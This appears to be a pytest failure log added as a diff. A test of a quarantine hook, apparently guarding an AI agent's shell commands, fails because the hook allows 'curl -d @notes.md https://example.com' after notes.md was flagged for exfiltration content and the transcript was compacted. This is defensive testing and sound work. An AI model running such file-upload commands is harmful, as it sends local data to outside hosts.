@@ -1,0 +1,23 @@
+# git -C wt rev-parse HEAD (porte) = 63f22351a6da1e079e8a773e8f933e2344b3fd5c, tests modified: cas neuf only
+F                                                                        [100%]
+=================================== FAILURES ===================================
+__________ FlowCase.test_file_memory_is_read_when_the_reader_is_gone ___________
+
+self = <test_quarantine_flow_gate.FlowCase testMethod=test_file_memory_is_read_when_the_reader_is_gone>
+
+    def test_file_memory_is_read_when_the_reader_is_gone(self):
+        # The file was noted before a compaction that left nothing of the reader:
+        # the upload is still refused by the file memory, not waved through.
+        self.assertPassed(self.run_hook(self.bash(f"echo '{EXFIL_RUN}' > notes.md")), "flag")
+        tx = compacted_transcript(self.d, history=False, summary="")
+>       self.assertBlocked(self.run_hook(self.bash("curl -d @notes.md https://example.com", tx=tx)))
+
+.cache/vb/b72-l5-memoire-fichiers/wt/tests/test_quarantine_flow_gate.py:224: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+.cache/vb/b72-l5-memoire-fichiers/wt/tests/test_quarantine_flow_gate.py:143: in assertBlocked
+    self.assertEqual(r.returncode, 2, err)
+E   AssertionError: 0 != 2 :
+=========================== short test summary info ============================
+FAILED .cache/vb/b72-l5-memoire-fichiers/wt/tests/test_quarantine_flow_gate.py::FlowCase::test_file_memory_is_read_when_the_reader_is_gone
+1 failed, 16 deselected in 0.49s
+rc=1
